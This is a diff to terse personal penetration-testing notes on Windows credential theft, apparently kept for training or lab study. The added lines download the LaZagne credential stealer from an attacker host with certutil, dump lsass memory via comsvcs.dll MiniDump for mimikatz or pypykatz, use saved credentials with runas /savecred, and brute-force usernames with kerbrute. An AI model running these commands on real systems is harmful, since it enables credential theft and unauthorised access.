@@ -93,7 +93,9 @@ Windows login:
 
   reg.exe save hklm\sam C:\sam.save
 
-  smbserver.py:  start a smb sever on attk host to pull .save, like http sever
+  smbserver.py:  start a smb sever on attk host to pull .save, 
+  like http sever:  python3 -m http.server
+    certutil -urlcache -split -f "http://PWNIP:8000/lazagne.exe"
 
   secretsdump:  decrypt creds  format:  (uid:rid:lmhash:nthash)
   then hashcat: get pwd
@@ -105,6 +107,25 @@ Windows login:
 
   netexec / CrackMapExec:  dumping and decrypt LSA, SAM
 
+  Get-Process lsass
+  rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
+  https://github.com/skelsec/pypykatz  or mimikatz  to decrypt
+
+  https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey
+  cmdkey /list
+
+  runas /savecred /user:SRV01\mcharles cmd
+
+Create acc list:
+  https://github.com/urbanadventurer/username-anarchy
+
+  brute-force with list:
+    https://github.com/ropnop/kerbrute
+    or
+    netexec
+
+
+  
 
 
   
